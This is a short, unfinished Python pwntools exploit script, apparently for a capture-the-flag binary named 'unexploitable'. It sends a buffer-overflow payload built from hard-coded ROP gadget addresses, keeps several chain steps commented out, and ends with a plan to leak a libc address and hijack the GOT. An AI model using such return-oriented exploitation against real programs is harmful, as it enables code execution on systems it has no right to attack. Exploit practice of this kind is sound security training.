#!/usr/bin/env python2

from pwn import *

pop_rbp_ret = 0x400512
mov_edi_rsp0x30_add_rsp_0x38 = 0x400600
call_read = 0x400567

p = process('./unexploitable')
sleep(4)
p.send( 'AAAA'*3 +	# buf[4] + rbp
	flatten(pop_rbp_ret, 0x601028,

	)
	#p64(mov_edi_rsp0x30_add_rsp_0x38).ljust(0x30) +	# ret
	#p64(0x601010) +	# sleep GOT
	#p64(call_read)
	)




push_rsp_ret_1 = 0x199884


'''
use pop rbp, call read to control stack
return to pop 1
call other read to make rax = 1
use rbp to control rdi
call write to leak libc address
GOT hijiack
'''
